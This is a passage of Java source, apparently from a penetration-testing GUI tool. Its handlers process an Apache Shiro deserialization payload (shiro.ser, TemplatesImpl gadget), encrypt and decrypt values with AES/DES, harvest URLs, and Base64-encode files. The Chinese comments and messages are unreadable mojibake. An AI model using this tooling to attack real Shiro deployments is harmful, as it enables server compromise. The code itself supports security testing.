                System.out.println(f2.delete());
                if ( f.exists() && f.length() > 0L) {
                    System.out.println("[+] ?????????Gadeget???TemplatesImpl???bytecodes?????????????????????bytecodes.class???????????????idea?????????");
                    String s = null;
                    BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(f)));
                    while((s = br.readLine()) != null) {
                        total = total + s + "\n";
                    }
                    br.close();
                    mTextArea28.setText(total);
                    System.out.println(f.delete());
                } else {
                    mTextArea28.setText("[+] ????????????????????????shiro.ser????????????xxd shiro.ser???????????????????????????");
                    System.out.println("[+] ????????????????????????shiro.ser????????????xxd shiro.ser???????????????????????????");
                }


            } catch (IOException e) {
                e.printStackTrace();
            }

        }catch (Exception e){
            mTextArea28.setText("????????????????????????????????????????????????key????????????");
        }



    }

    // ???????????????-??????
    public void onButton30Click(ActionEvent actionEvent) throws Exception {
        String encodemode = (String) mChoiceBox1.getValue(); // AES / DES / DESede
        String ivmode = (String) mChoiceBox2.getValue(); // iv?????? ECB / CBC
        String paddingmode = (String) mChoiceBox3.getValue(); // ????????????
        String sSrcmode = (String) mChoiceBox4.getValue(); // ????????????
        String keyivmode = (String) mChoiceBox5.getValue(); // key iv??????

        String skey = mTextField14.getText().trim(); // key ??????
        String iv = mTextField15.getText().trim(); // iv
        String sSrc = mTextArea29.getText().trim(); // ??????

        if (mRadiobutton10.isSelected()){
            String dDes2 = decryptbuwei(sSrc, skey, iv, encodemode, ivmode, paddingmode, sSrcmode, keyivmode);
            mTextArea30.setText(dDes2);
        }else {
            if (keyivmode.equals("Base64")) { // ??????key iv?????????????????????
                String dDes2 = decryptJsCode(sSrc, skey, iv, encodemode, ivmode, paddingmode, sSrcmode, keyivmode);
                mTextArea30.setText(dDes2);
            }else if(keyivmode.equals("Hex")){
                String dDes2 = decryptJsCode(sSrc, skey, iv, encodemode, ivmode, paddingmode, sSrcmode, keyivmode);
                mTextArea30.setText(dDes2);
            }else {
                String dDes = decrypt(sSrc, skey, iv, encodemode, ivmode, paddingmode, sSrcmode);
                mTextArea30.setText(dDes);
            }
        }
    }

    // ???????????????-??????
    public void onButton31Click(ActionEvent actionEvent) throws Exception {
        String encodemode = (String) mChoiceBox1.getValue(); // AES / DES / DESede
        String ivmode = (String) mChoiceBox2.getValue(); // iv?????? ECB / CBC
        String paddingmode = (String) mChoiceBox3.getValue(); // ????????????
        String sSrcmode = (String) mChoiceBox4.getValue(); // ????????????
        String keyivmode = (String) mChoiceBox5.getValue(); // key iv??????

        String skey = mTextField14.getText().trim(); // key ??????
        String iv = mTextField15.getText().trim(); // iv
        String sSrc = mTextArea30.getText().trim(); // ??????
        if (mRadiobutton10.isSelected()){
            String dDes2 = encryptbuwei(sSrc,"123" ,skey, iv, encodemode, ivmode, paddingmode, sSrcmode, keyivmode);
            mTextArea29.setText(dDes2);
        }else {
            if (keyivmode.equals("Base64")) { // ??????key iv?????????????????????
                String dDes2 = encryptJsUserInfo(sSrc, skey, iv, encodemode, ivmode, paddingmode, sSrcmode, keyivmode);
                mTextArea29.setText(dDes2);
            } else if (keyivmode.equals("Hex")) { // ??????key iv?????????????????????
                String dDes2 = encryptJsUserInfo(sSrc, skey, iv, encodemode, ivmode, paddingmode, sSrcmode, keyivmode);
                mTextArea29.setText(dDes2);
            }else {
                String dDes = encrypt(sSrc, skey, iv, encodemode, ivmode, paddingmode, sSrcmode);
                mTextArea29.setText(dDes);
            }
        }
    }

    // ??????????????????
    public void onButton32Click(ActionEvent actionEvent) throws Exception {
        proxy();
        String pattern = "(http[s]{0,1}://.*?)/|(http[s]{0,1}://.*)"; // ????????????
        String url = mTextField20.getText().trim();
        String pat = mTextArea34.getText().trim();
        String black_lists = mTextArea33.getText().trim(); // ?????????
        String input = mTextArea31.getText().trim(); // ??????or url???????????????

        String total = "";
        String total2 = "";
        String[] url_list;
        test7.vullist = new ArrayList();

        if (pat.contains(".")){

            String[] pats = pat.split("\n");
            for( String str: pats) {
                total = total + str.replace(".", "\\.");
                total = total + ".*?|";
            }
            pat = "(" + total.substring(0,total.length()-1) + ")";

        }else{
            if (pat.equals(""))
                pat = "/";
        }
        if (!url.equals("")) {
            // ?????? Pattern ??????
            Pattern r = Pattern.compile(pattern);
            // ???????????? matcher ??????
            Matcher m = r.matcher(url);
            m.find();
            String host = m.group(); // ????????????+??????
            Set<String> response = extractLists(url, pat);
            url_list = new ArrayList<>(response).toArray(new String[0]);
            for (int i = 0; i < url_list.length; i++) {
                test7.vullist.add(url_list[i]);
                if (!url_list[i].contains("http"))
                    url_list[i] = host.substring(0, host.length() - 1) + url_list[i];
            }
            test7 a = new test7();
            a.getUriList( url_list , pat );
            String[] blacklists = black_lists.split("\n");
            Set<String> total_lists = new HashSet<>();

            for (String strr: test7.vullist) {
                String isblack = "0";
                for (String str:blacklists) { // ???????????????
                    if (strr.contains(str))
                        isblack = "1";
                }
                if (isblack.equals("0"))
                    total_lists.add(strr.trim());
            }
            for (String strr: total_lists) {
                total2 = total2 + strr + "\n";
            }
        }
        else{
            Set<String> response = extractListsinput(input, pat);
            url_list = new ArrayList<>(response).toArray(new String[0]);

            String[] blacklists = black_lists.split("\n");
            Set<String> total_lists = new HashSet<>();

            for (String strr : url_list) {
                String isblack = "0";
                if (!black_lists.equals(""))
                    for (String str : blacklists) { // ???????????????
                        if (strr.contains(str))
                            isblack = "1";
                    }
                if (isblack.equals("0"))
                    total_lists.add(strr.trim());
            }
            for (String strr : total_lists) {
                total2 = total2 + strr + "\n";
            }
        }
        System.out.println(total2);
        mTextArea32.setText(total2.trim());

    }

    // ??????python??????
    public void onButton12Click(ActionEvent actionEvent) throws IOException {
        String python2path = mTextField8.getText().trim(); // python2 ??????
        String python3path = mTextField82.getText().trim(); // python3 ??????

        String jarPath = Main.class.getProtectionDomain().getCodeSource().getLocation().getFile(); // ??????config.properties????????????

        String os = System.getProperty("os.name");

        if (!jarPath.contains(".jar") && !os.toLowerCase().startsWith("win")) {

            System.out.println("???jar????????????");

        }else if(os.toLowerCase().startsWith("win")){
            String target = "python2path=" + python2path + '\n' + "python3path=" + python3path;
            poctoFile(target, "property/config.properties");

        }else{
            Properties prop = new Properties();
            prop.load(Main.class.getResourceAsStream("/config.properties"));  // ???????????????

            prop.setProperty("python2path", python2path);
            prop.setProperty("python3path", python3path);
            String tempPath = jarPath.substring(0, jarPath.lastIndexOf("/")) + "/config.properties";

            System.out.println(tempPath);
            Writer w = new FileWriter(tempPath);
            prop.store(w, "python run path");
            w.close();
            String[] command = new String[100];
            command[0] = "jar";
            command[1] = "uf";
            command[2] = Main.class.getProtectionDomain().getCodeSource().getLocation().getFile();
            command[3] = "config.properties";
            // jar uf esjavaclient-0.0.1-SNAPSHOT.jar config.properties ??????jar?????????config.properties??????

            String[] commands = deleteArrayNull(command);
            for (String s : commands)
                System.out.println(s);

            try {
                Process pro = Runtime.getRuntime().exec(commands);
                String[] command2 = new String[100];
                Robot r = new Robot();
                r.delay(500);
                command2[0] = "rm";
                command2[1] = tempPath;
                String[] commands2 = deleteArrayNull(command2);
                Process pro2 = Runtime.getRuntime().exec(commands2);

            } catch (Exception e) {
                // TODO: handle exception
            }
        }
    }

    public void onButton33Click(ActionEvent actionEvent) throws Exception {
        Stage stage=new Stage();
        FileChooser fileChooser = new FileChooser();
        //fileChooser.getExtensionFilters().addAll(
        //        new FileChooser.ExtensionFilter("HTML", "*.class"),
        //        new FileChooser.ExtensionFilter("HTML", "*.txt")
        //);
        File file2 = fileChooser.showOpenDialog(stage);

        try {

            mTextArea35.setText(Base64Encode(file2));
            //byte[] bytes = loadFile(file2);
            //
            //byte[] encoded = Base64.encodeBase64(bytes);

            //String encodedString = new String(encoded,StandardCharsets.US_ASCII);

            // ??????????????????byte??????

            mTextArea36.setText(bytesEncode(file2));

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
